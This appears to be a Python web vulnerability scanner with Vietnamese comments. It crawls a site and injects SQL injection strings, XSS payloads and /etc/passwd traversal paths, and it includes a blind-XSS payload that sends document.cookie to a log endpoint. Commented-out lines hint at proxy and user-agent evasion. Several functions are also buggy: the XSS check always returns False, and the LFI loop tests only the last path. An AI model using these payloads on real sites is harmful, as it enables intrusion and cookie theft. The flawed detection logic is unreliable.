import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re
import sys

# from Antidetect import *



def scan_website(url):
    # user_agent = get_random_user_agent()
    # proxy = get_random_proxy()
    results = []
    
    # Crawl website 
    urls = crawl(url)
    
    # Scan URLs
    for u in urls:
        # response = requests.get(url, headers={'User-Agent': user_agent}, proxies={'http': proxy, 'https': proxy})

        response = requests.get(u)
        
        if check_sqli(u, response):
            results.append({'url': u, 'vuln': 'SQL Injection'})
            
        if check_xss(u, response):
            results.append({'url': u, 'vuln': 'Cross Site Scripting'})
            
        if check_lfi(u):
            results.append({'url': u, 'vuln': 'Local File Inclusion'})
            
    return results
        
def crawl(url):
    urls = []
    response = requests.get(url.replace('https://', 'http://'), verify=False)
    parsed = BeautifulSoup(response.text, 'html.parser')
    
    for link in parsed.find_all('a'):
        path = link.get('href')
        if path and path.startswith('/'):
            path = urljoin(url, path)
            urls.append(path)
    return urls

# Hàm kiểm tra SQL injection
def check_sqli(url, resp1):
  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
  
  for test_url in test_urls:
    resp1 = requests.get(test_url)  
    if check_error(resp1):
      print("Error based SQLi detected")
      return True

# Kiểm tra blind SQLi
  original_url = f"{url}&id=1" 
  resp2 = requests.get(original_url)

  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
  resp3 = requests.get(test_url)

  columns1 = len(resp2.text.split("</td>"))
  columns2 = len(resp3.text.split("</td>"))

  if columns1 != columns2:
     print("Blind SQLi detected")
     return True
  
  return False

def check_error(response):
  # Kiểm tra nội dung lỗi 
  if "SQL syntax" in response.text:
    return True
  # Kiểm tra time delay
  if response.elapsed.total_seconds() > 1:  
    return True
    
  return False

# -----------------------------------------------------------------------
# Hàm kiểm tra XSS
session = requests.Session()
payloads = ["<script>alert(1)</script>", "';alert(1)//", "<img src=1 onerror=alert(1)>"] 

def check_xss(url, response):

  soup = BeautifulSoup(response.content, 'html.parser')

  # Check forms
  forms = soup.findAll('form')
  for form in forms:
    data = {} 
    for input in form.findAll('input'):
      for payload in payloads:
        data[input.get('name')] = payload
        response = session.post(url + form['action'], data=data)
        if payload in response.text:
          print('XSS in', url + form['action'])

  # Check URL parameters
  params = re.findall(r'([^?=&]+)=([^&]*)', url)
  for name, value in params:
    for payload in payloads:
      url = url.replace(f'{name}={value}', f'{name}={payload}')
      response = session.get(url)
      if payload in response.text:
        print('XSS in', url)

  return False

# ------------------------
url = sys.argv[2]
domain = url.rsplit('/', 1)[0]

def check_blind_xss(url):
  payload = f"<script>fetch('{domain}/log?cookie=' + document.cookie)</script>"

  requests.get(url + payload)
  
  if requests.get(f"{domain}/log").text == "XSSCOOKIE":
    print("Blind XSS detected")

check_blind_xss(url)


# -------------------------------------------------
# Hàm kiểm tra LFI  
def check_lfi(url):
  pwd_paths = []
  
  with open('pwd.txt') as f:
    pwd_paths = f.read().splitlines()

  for path in pwd_paths:
 # Thử truy cập đến file /etc/passwd với các giá trị dẫn đến file/etc/pwd trong file pwd.txt
    lfi_url = url + path
    lfi_response = requests.get(lfi_url)
  
  # Nếu trả về nội dung file passwd là có LFI
  if "root:" in lfi_response.text and "nobody:" in lfi_response.text:
    print("Detected LFI")
    return True
  
  return False
  